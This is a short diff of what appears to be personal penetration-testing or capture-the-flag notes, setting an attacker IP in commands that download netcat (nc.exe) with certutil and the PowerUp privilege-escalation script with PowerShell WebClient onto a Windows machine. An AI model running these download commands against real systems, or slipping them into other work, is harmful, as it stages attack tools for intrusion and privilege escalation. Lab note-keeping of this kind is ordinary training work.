@@ -33,7 +33,7 @@ $url = "http://10.10.16.112/powerUp.ps1";$output = "C:\Users\Chase\Desktop\power
 
 #Download file
 
-certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe
+certutil -urlcache -split -f http://10.10.16.112/nc.exe nc.exe
 
 (new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/powerUp.ps1','C:\Windows\Temp\test\powerup.ps1')
 
